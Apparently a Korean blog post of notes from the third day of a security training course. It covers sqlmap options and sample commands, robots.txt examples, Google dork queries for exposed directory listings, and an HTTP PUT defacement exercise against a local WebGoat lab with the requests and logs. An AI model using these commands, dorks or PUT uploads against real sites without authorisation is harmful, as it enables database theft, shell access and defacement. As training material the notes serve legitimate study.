@@ -1,0 +1,341 @@
+---
+title: "보안교육 3일차"
+date: 2015-09-09 15:01:00 +0900
+categories: [경험 및 정보 공유]
+original_url: "https://blog.naver.com/kkforgg/220476394752"
+---
+
+SQL MAP
+
+option
+
+실행 명령어
+
+python sqlmap.py -h <-- help 페이지
+
+-----------------------------------------------------------
+몹션 목록
+-----------------------------------------------------------
+
+Usage: sqlmap.py [options]
+
+Options:
+  -h, --help            Show basic help message and exit
+  -hh                   Show advanced help message and exit
+  --version             Show program's version number and exit
+  -v VERBOSE            Verbosity level: 0-6 (default 1)
+
+  Target:
+    At least one of these options has to be provided to define the
+    target(s)
+
+    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+    -g GOOGLEDORK       Process Google dork results as target URLs
+
+  Request:
+    These options can be used to specify how to connect to the target URL
+
+    --data=DATA         Data string to be sent through POST
+    --cookie=COOKIE     HTTP Cookie header value
+    --random-agent      Use randomly selected HTTP User-Agent header value
+    --proxy=PROXY       Use a proxy to connect to the target URL
+    --tor               Use Tor anonymity network
+    --check-tor         Check to see if Tor is used properly
+
+  Injection:
+    These options can be used to specify which parameters to test for,
+    provide custom injection payloads and optional tampering scripts
+
+    -p TESTPARAMETER    Testable parameter(s)
+    --dbms=DBMS         Force back-end DBMS to this value
+
+  Detection:
+    These options can be used to customize the detection phase
+
+    --level=LEVEL       Level of tests to perform (1-5, default 1)
+    --risk=RISK         Risk of tests to perform (1-3, default 1)
+
+  Techniques:
+    These options can be used to tweak testing of specific SQL injection
+    techniques
+
+    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
+
+  Enumeration:
+    These options can be used to enumerate the back-end database
+    management system information, structure and data contained in the
+    tables. Moreover you can run your own SQL statements
+
+    -a, --all           Retrieve everything
+    -b, --banner        Retrieve DBMS banner
+    --current-user      Retrieve DBMS current user
+    --current-db        Retrieve DBMS current database
+    --passwords         Enumerate DBMS users password hashes
+    --tables            Enumerate DBMS database tables
+    --columns           Enumerate DBMS database table columns
+    --schema            Enumerate DBMS schema
+    --dump              Dump DBMS database table entries
+    --dump-all          Dump all DBMS databases tables entries
+    -D DB               DBMS database to enumerate
+    -T TBL              DBMS database table(s) to enumerate
+    -C COL              DBMS database table column(s) to enumerate
+
+  Operating system access:
+    These options can be used to access the back-end database management
+    system underlying operating system
+
+    --os-shell          Prompt for an interactive operating system shell
+    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
+
+  General:
+    These options can be used to set some general working parameters
+
+    --batch             Never ask for user input, use the default behaviour
+    --flush-session     Flush session files for current target
+
+  Miscellaneous:
+    --sqlmap-shell      Prompt for an interactive sqlmap shell
+    --wizard            Simple wizard interface for beginner users
+
+[!] to see full list of options run with '-hh'
+
+-----------------------------------------------------------
+
+- get 방식
+sqlmap.py -u <http://w.x.com/bbs/a.jsp?id=1>
+
+- post 방식
+
+sqlmap.py -u <http://w.x.com/bbs/a.jsp?id=1> --data=id
+
+- cookie 값 이용
+
+sqlmap.py -u <http://w.x.com/bbs/a.jsp?id=1> --cookie=value
+
+- 레벨 설정
+
+sqlmap.py -u <http://w.x.com/bbs/a.jsp?id=1> --level=1~5
+
+- 상황설정
+
+sqlmap.py -u <http://w.x.com/bbs/a.jsp?id=1> --level=0~6
+
+##################################################################
+
+robots.txt
+
+검색엔진 배제 표준.
+
+검색 엔진에서 검색 허용 범위를 지정하는 것.
+
+posco a&c 프로젝트 진행시 ㅋㅋ 모든 경로 차단해달라고 해서
+
+disallow : /* 했었음
+
+User-Agent : *  (모든 검색엔진)
+Disallow : / (모든 디렉토리)
+
+ex)
+
+<https://www.whitehouse.gov/robots.txt>
+
+미국 백악관쪽 확인
+
+#
+# robots.txt
+#
+# This file is to prevent the crawling and indexing of certain parts
+# of your site by web crawlers and spiders run by sites like Yahoo!
+# and Google. By telling these "robots" where not to go on your site,
+# you save bandwidth and server resources.
+#
+# This file will be ignored unless it is at the root of your host:
+# Used:    <http://example.com/robots.txt>
+# Ignored: <http://example.com/site/robots.txt>
+#
+# For more information about the robots.txt standard, see:
+# <http://www.robotstxt.org/wc/robots.html>
+#
+# For syntax checking, see:
+# <http://www.sxw.org.uk/computing/robots/check.html>
+
+User-agent: *
+Crawl-delay: 10    <-- 10초 마다 설정되도록
+# Directories
+Disallow: /includes/
+Disallow: /misc/
+Disallow: /modules/
+Disallow: /profiles/
+Disallow: /scripts/
+Disallow: /themes/
+# Files
+Disallow: /CHANGELOG.txt
+Disallow: /cron.php
+Disallow: /INSTALL.mysql.txt
+Disallow: /INSTALL.pgsql.txt
+Disallow: /install.php
+Disallow: /INSTALL.txt
+Disallow: /LICENSE.txt
+Disallow: /MAINTAINERS.txt
+Disallow: /update.php
+Disallow: /UPGRADE.txt
+Disallow: /xmlrpc.php
+# Paths (clean URLs)
+Disallow: /admin/
+Disallow: /comment/reply/
+Disallow: /filter/tips/
+Disallow: /logout/
+Disallow: /node/add/
+Disallow: /search/
+Disallow: /user/register/
+Disallow: /user/password/
+Disallow: /user/login/
+# Paths (no clean URLs)
+Disallow: /?q=admin/
+Disallow: /?q=comment/reply/
+Disallow: /?q=filter/tips/
+Disallow: /?q=logout/
+Disallow: /?q=node/add/
+Disallow: /?q=search/
+Disallow: /?q=user/password/
+Disallow: /?q=user/register/
+Disallow: /?q=user/login/
+
+디렉토리 및 패스들을 접근하지 말라고 설정함.
+
+ex) 청와대
+
+<http://www.president.go.kr/robots.txt>
+
+User-agent: *
+
+다들어와
+
+겁나 심플함 ㅋㅋㅋㅋ
+
+############################################
+
+디렉토리 노출 키워드 검색엔진
+# 아파치 계열
+site:co.kr Index of
+
+# 윈도우 계열
+site:co.kr To Parent Directory
+
+google에서 검색하니까 쭉 나온다 ㅡㅡ;;
+
+##############################################
+
+Http Put method 를 이용하는 공격
+
+##############################################
+
+1. WebGoat 에 WebDAV(웹다브) 서버 생성
+
+2. Put 메소드로 WebGoat 에 파일 생성(홈페이지 변조)
+
+3. 변조내용 확인
+
+// 테스트 서버 내에
+
+폴더구조 노출되도록 설정 하고,
+
+<http://localhost.:8080/WebGoat/> <-- 실행시 디렉토리 노출되도록
+
+database 폴더 클릭
+
+proxy 를 이용하여 보면 아래와 같이 생성된다.
+
+GET <http://localhost.:8080/WebGoat/database/> HTTP/1.1
+Accept: text/html, application/xhtml+xml, */*
+Referer: <http://localhost.:8080/WebGoat/>
+Accept-Language: ko-KR
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko
+DNT: 1
+Host: localhost.:8080
+Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+
+Scan-Ray 상단 메뉴
+도구 -> HTTP 패킷 전송 클릭
+
+전송 해더 구문에 GET 을 PUT으로 변경. (PUT은 POST와 동일하다.)
+
+<html>
+<head>
+ <title>hello</title>
+</head>
+<body>
+ Hello ~~~
+</body>
+</html>
+
+위 내용을 하단에 창에 복사 붙여넣기
+
+PUT <http://localhost.:8080/WebGoat/database/test.html> HTTP/1.1
+Accept: text/html, application/xhtml+xml, */*
+Referer: <http://localhost.:8080/WebGoat/>
+Accept-Language: ko-KR
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko
+DNT: 1
+Host: localhost.:8080
+Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+
+위와 같이 url 에 페이지를 하나 만든다.
+
+그러면 다음과 같이 응답된다.
+
+HTTP/1.1 201 Created
+Server: Apache-Coyote/1.1
+Cache-Control: private
+Expires: Thu, 01 Jan 1970 09:00:00 KST
+Content-Length: 0
+Date: Wed, 09 Sep 2015 01:41:35 GMT
+
+<http://localhost.:8080/WebGoat/database/test.html>
+
+치면 아까 put한 페이지가 생성된걸 확인 할 수 있다.
+
+그런 뒤
+
+tomcat 내에 access.log 를 보면
+
+127.0.0.1 - - [09/Sep/2015:10:29:35 +0900] "GET / HTTP/1.1" 200 11444
+127.0.0.1 - - [09/Sep/2015:10:29:35 +0900] "GET /tomcat.css HTTP/1.1" 200 5926
+127.0.0.1 - - [09/Sep/2015:10:29:35 +0900] "GET /tomcat.png HTTP/1.1" 200 5103
+127.0.0.1 - - [09/Sep/2015:10:29:35 +0900] "GET /bg-nav.png HTTP/1.1" 200 1401
+127.0.0.1 - - [09/Sep/2015:10:29:35 +0900] "GET /asf-logo.png HTTP/1.1" 200 17811
+127.0.0.1 - - [09/Sep/2015:10:29:35 +0900] "GET /bg-middle.png HTTP/1.1" 200 1918
+127.0.0.1 - - [09/Sep/2015:10:29:35 +0900] "GET /bg-upper.png HTTP/1.1" 200 3103
+127.0.0.1 - - [09/Sep/2015:10:29:35 +0900] "GET /bg-button.png HTTP/1.1" 200 713
+127.0.0.1 - - [09/Sep/2015:10:29:39 +0900] "GET /webGoat/ HTTP/1.1" 404 979
+127.0.0.1 - - [09/Sep/2015:10:29:47 +0900] "GET /WebGoat/ HTTP/1.1" 401 954
+127.0.0.1 - guest [09/Sep/2015:10:29:51 +0900] "GET /WebGoat/ HTTP/1.1" 200 4384
+127.0.0.1 - guest [09/Sep/2015:10:33:45 +0900] "GET /WebGoat/ HTTP/1.1" 200 4384
+127.0.0.1 - guest [09/Sep/2015:10:34:23 +0900] "GET /WebGoat/ HTTP/1.1" 200 4384
+127.0.0.1 - guest [09/Sep/2015:10:34:33 +0900] "GET /WebGoat/database/ HTTP/1.1" 200 1410
+127.0.0.1 - guest [09/Sep/2015:10:41:35 +0900] "PUT /WebGoat/database/test.html HTTP/1.1" 201 -
+127.0.0.1 - guest [09/Sep/2015:10:41:58 +0900] "GET /WebGoat/database/ HTTP/1.1" 200 1642
+127.0.0.1 - guest [09/Sep/2015:10:42:01 +0900] "GET /WebGoat/database/test.html HTTP/1.1" 200 77
+
+PUT 된 내역을 확인 할 수 있다.
+
+################################################################
+보안점검가이드
+################################################################
+
+구글에서 시큐어코딩 보안약점 47개 기준 <- 검색
+
+<http://www.mospa.go.kr/frt/bbs/type001/commonSelectBoardArticle.do?bbsId=BBSMSTR_000000000045&nttId=34430>
+
+첨부 파일로 확인 할 수 있다.
+
+우리나라 쪽에서 가이드는 좀 허접하기 때문에 구글로 검색해서 원문으로 되어있는 내용들을 참조하는 것이 더 좋다.
+ex) 안드로이드 관련 시큐어 코딩
+
+<https://www.jssec.org/report/android_securecoding_en_20140801.html>
+
+일본 사람들이 만든 매뉴얼 같이 보면 좋다.
+
+미국에서도 만드는 중.
+
+<https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=111509535>
